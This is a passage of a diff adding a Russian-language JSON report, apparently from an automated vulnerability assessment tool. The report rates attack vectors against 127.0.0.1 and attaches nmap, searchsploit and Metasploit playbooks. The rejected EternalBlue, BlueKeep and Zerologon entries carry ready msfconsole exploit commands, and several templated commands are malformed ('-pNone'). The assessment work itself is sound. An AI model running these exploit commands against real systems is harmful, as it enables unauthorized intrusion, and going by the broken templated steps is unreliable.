+      "severity": "MEDIUM",
+      "port": null,
+      "service": "generic",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "generic",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Использование небезопасной конфигурации для расширения доступа."
+      },
+      "playbook": {
+        "tools": [
+          "Firewall configuration"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit generic",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] Node.js Express NODE_ENV Development Mode",
+      "attack_vector_id": "node-express-dev-env",
+      "attack_type": "",
+      "severity": "MEDIUM",
+      "port": 4833,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Порт 4833 виден атакующему, но не подтверждён инвентаризацией сервера",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "warn",
+          "evidence": "Порт 4833 виден атакующему, но не подтверждён инвентаризацией сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 4833 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "Unknown",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 4833",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p4833 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 4833"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] Node.js Express NODE_ENV Development Mode",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "Footprinting / Reconnaissance",
+      "attack_vector_id": "CAPEC-169",
+      "attack_type": "reconnaissance",
+      "severity": "LOW",
+      "port": null,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1046",
+            "name": "Network Service Discovery",
+            "tactic": "Discovery",
+            "description": "Перечисление сетевых сервисов и портов для поиска точек входа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "неизвестно",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit Footprinting / Reconnaissance",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "Excavation (Banner Grabbing)",
+      "attack_vector_id": "CAPEC-116",
+      "attack_type": "reconnaissance",
+      "severity": "LOW",
+      "port": null,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1046",
+            "name": "Network Service Discovery",
+            "tactic": "Discovery",
+            "description": "Перечисление сетевых сервисов и портов для поиска точек входа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "неизвестно",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit Excavation (Banner Grabbing)",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] LabVIEW/NI Service Locator",
+      "attack_vector_id": "labview-service-locator-enum",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 3580,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту 3580 напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3580 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 3580 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "Unknown",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 3580",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p3580 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 3580"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] LabVIEW/NI Service Locator",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] Wappalyzer Technology Detection",
+      "attack_vector_id": "tech-detect",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 8443,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "warn",
+          "evidence": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 8443 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "HTTPS-Alt",
+        "version_observed": "",
+        "system_component": "HTTPS-сервис управления",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p8443 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 8443"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] Wappalyzer Technology Detection",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] HTTP Missing Security Headers",
+      "attack_vector_id": "http-missing-security-headers",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 3580,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту 3580 напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3580 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 3580 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "Unknown",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 3580",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p3580 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 3580"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] HTTP Missing Security Headers",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] HTTP Missing Security Headers",
+      "attack_vector_id": "http-missing-security-headers",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 8443,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "warn",
+          "evidence": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 8443 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "HTTPS-Alt",
+        "version_observed": "",
+        "system_component": "HTTPS-сервис управления",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p8443 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 8443"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] HTTP Missing Security Headers",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] Basic Auth Detection",
+      "attack_vector_id": "basic-auth-detect",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 4096,
+      "service": "",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту 4096 напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 4096 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 4096 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "Unknown",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 4096",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p4096 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 4096"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] Basic Auth Detection",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    }
+  ],
+  "rejected": [
+    {
+      "attack_name": "EternalBlue (MS17-010)",
+      "attack_vector_id": "AV-SMB-ETERNAL",
+      "attack_type": "remote_code_execution",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2017-0144 (MS17-010 (март 2017)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2017-0144 (MS17-010 (март 2017)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2017-0144",
+            "name": "Windows SMBv1 Remote Code Execution (EternalBlue)",
+            "description": "Переполнение в обработчике SMBv1 (srv.sys) позволяет удалённо выполнить произвольный код с правами SYSTEM. Лежит в основе WannaCry и NotPetya.",
+            "cvss": 8.1,
+            "cpe_affected": "Microsoft Windows SMBv1"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-20",
+            "name": "Improper Input Validation",
+            "description": "Некорректная проверка входных данных, ведущая к непредусмотренному поведению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows SMBv1",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Удалённое выполнение произвольного кода, потенциально с системными привилегиями; полный контроль над узлом."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit",
+          "EternalBlue"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Подтвердить наличие SMBv1",
+            "command": "nmap -p445 --script smb-protocols 127.0.0.1",
+            "expected_result": "В выводе присутствует SMBv1"
+          },
+          {
+            "n": 2,
+            "action": "Проверить уязвимость MS17-010",
+            "command": "nmap -p445 --script smb-vuln-ms17-010 127.0.0.1",
+            "expected_result": "Скрипт сообщает VULNERABLE"
+          },
+          {
+            "n": 3,
+            "action": "Запустить эксплойт",
+            "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Открыта Meterpreter-сессия с правами SYSTEM"
+          }
+        ],
+        "source": "metasploit:exploit/windows/smb/ms17_010_eternalblue"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "OS-specific: CVE-2019-0708",
+      "attack_vector_id": "CVE-2019-0708",
+      "attack_type": "os_specific",
+      "severity": "CRITICAL",
+      "port": null,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2019-0708 (затрагивает только Windows 7/2008 R2 и старше) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2019-0708 (затрагивает только Windows 7/2008 R2 и старше) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2019-0708",
+            "name": "Windows RDP Remote Code Execution (BlueKeep)",
+            "description": "Use-after-free в службе удалённого рабочего стола (RDP) позволяет удалённо выполнить код без аутентификации. Затрагивает Windows 7 / Server 2008 R2 и старше.",
+            "cvss": 9.8,
+            "cpe_affected": "Microsoft Windows 7 / Server 2008 R2 (RDP)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-416",
+            "name": "Use After Free",
+            "description": "Обращение к памяти после её освобождения, ведущее к выполнению кода."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows 7 / Server 2008 R2 (RDP)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "OS-specific: CVE-2020-1472",
+      "attack_vector_id": "CVE-2020-1472",
+      "attack_type": "os_specific",
+      "severity": "CRITICAL",
+      "port": null,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2020-1472 (устранено августом 2020; также требует роли контроллера домена) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2020-1472 (устранено августом 2020; также требует роли контроллера домена) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2020-1472",
+            "name": "Netlogon Elevation of Privilege (Zerologon)",
+            "description": "Криптографическая ошибка в протоколе Netlogon позволяет получить права администратора домена. Применима к контроллерам домена.",
+            "cvss": 10.0,
+            "cpe_affected": "Microsoft Windows Server (контроллер домена, Netlogon)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-330",
+            "name": "Use of Insufficiently Random Values",
+            "description": "Использование предсказуемых значений в криптографических операциях."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-1",
+            "name": "Accessing Functionality Not Properly Constrained by ACLs",
+            "description": "Доступ к функциям, не защищённым списками контроля доступа."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows Server (контроллер домена, Netlogon)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:auxiliary/admin/dcerpc/cve_2020_1472_zerologon"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "OS-specific: CVE-2021-31166",
+      "attack_vector_id": "CVE-2021-31166",
+      "attack_type": "os_specific",
+      "severity": "CRITICAL",
+      "port": null,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 вне диапазона, уязвимого к CVE-2021-31166 (только сборки 2004/20H2/21H1 (май 2021)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 вне диапазона, уязвимого к CVE-2021-31166 (только сборки 2004/20H2/21H1 (май 2021)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-31166",
+            "name": "Windows HTTP Protocol Stack Remote Code Execution",
+            "description": "Двойное освобождение в http.sys позволяет удалённо выполнить код/вызвать отказ. Затрагивает Windows 10 2004/20H2/21H1.",
+            "cvss": 9.8,
+            "cpe_affected": "Microsoft Windows 10 2004/20H2/21H1 (http.sys)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-415",
+            "name": "Double Free",
+            "description": "Повторное освобождение памяти, ведущее к повреждению кучи и выполнению кода."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+            "description": "Отказ в обслуживании конечного узла через исчерпание ресурсов."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows 10 2004/20H2/21H1 (http.sys)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit OS-specific: CVE-2021-31166",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "EternalChampion (MS17-010)",
+      "attack_vector_id": "AV-SMB-ETERNALCHAMP",
+      "attack_type": "remote_code_execution",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2017-0146 (MS17-010 (март 2017)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2017-0146 (MS17-010 (март 2017)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2017-0146",
+            "name": "Windows SMBv1 Remote Code Execution (EternalChampion)",
+            "description": "Состояние гонки в SMBv1 (транзакции) позволяет удалённо выполнить код. Эксплуатируется через MS17-010.",
+            "cvss": 8.1,
+            "cpe_affected": "Microsoft Windows SMBv1"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-362",
+            "name": "Race Condition",
+            "description": "Состояние гонки при конкурентном доступе к разделяемому ресурсу."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-26",
+            "name": "Leveraging Race Conditions",
